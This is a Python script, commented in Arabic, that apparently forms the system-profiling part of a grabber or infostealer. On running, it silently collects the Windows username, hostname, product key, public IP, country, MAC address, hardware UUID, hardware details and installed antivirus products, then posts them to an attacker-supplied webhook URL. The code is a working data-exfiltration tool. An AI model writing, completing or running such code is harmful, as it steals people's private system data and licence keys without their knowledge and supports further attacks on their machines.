import os
import psutil
import pycountry
import requests
import subprocess

class PcInfo:
    def __init__(self, webhook_url):
        self.avatar = ""
        self.username = ""
        self.webhook_url = webhook_url
        self.get_system_info()

    def get_country_code(self, country_name):
        try:
            country = pycountry.countries.lookup(country_name)
            return str(country.alpha_2).lower()
        except LookupError:
            return "white"
        
    def get_all_avs(self) -> str:
        process = subprocess.run("WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName", shell=True, capture_output=True)
        if process.returncode == 0:
            output = process.stdout.decode(errors="ignore").strip().replace("\r\n", "\n").splitlines()
            if len(output) >= 2:
                output = output[1:]
                output = [av.strip() for av in output]
                return ", ".join(output)

    def get_system_info(self):
        computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
        cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
        gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
        ram = str(round(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,
                  shell=True).stdout.decode(errors='ignore').strip().split()[1]) / (1024 ** 3)))
        username = os.getenv("UserName")
        hostname = os.getenv("COMPUTERNAME")
        uuid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
        product_key = subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() if subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() != "" else "Failed to get product key"

        try:
            r: dict = requests.get("http://ip-api.com/json/?fields=225545").json()
            if r["status"] != "success":
                raise Exception("Failed")
            country = r["country"]
            proxy = r["proxy"]
            ip = r["query"]   
        except Exception:
            country = "Failed to get country"
            proxy = "Failed to get proxy"
            ip = "Failed to get IP"
                   
        _, addrs = next(iter(psutil.net_if_addrs().items()))
        mac = addrs[0].address

        # تجهيز البيانات لإرسالها إلى Webhook
        message = f'''
        PC Username: `{username}`
        PC Name: `{hostname}`
        OS: `{computer_os}`
        Product Key: `{product_key}`

        IP: `{ip}`
        Country: `{country}`
        Proxy: `{proxy if proxy else 'None'}`
        MAC: `{mac}`
        UUID: `{uuid}`

        CPU: `{cpu}`
        GPU: `{gpu}`
        RAM: `{ram}GB`

        Antivirus: `{self.get_all_avs()}`
        '''
        
        # إرسال البيانات إلى Webhook
        self.send_to_webhook(message)

    def send_to_webhook(self, message):
        data = {
            "content": message
        }
        response = requests.post(self.webhook_url, json=data)
        if response.status_code != 204:
            print(f"Error sending message: {response.text}")
        else:
            print("Message sent successfully to Webhook.")

# استخدم هذا الرابط عند إنشاء الكائن
webhook_url = "WEBHOOKS_URL"  # استبدل هذا بالرابط الخاص بـ Webhook

# إنشاء كائن من الكلاس
pc_info = PcInfo(webhook_url)
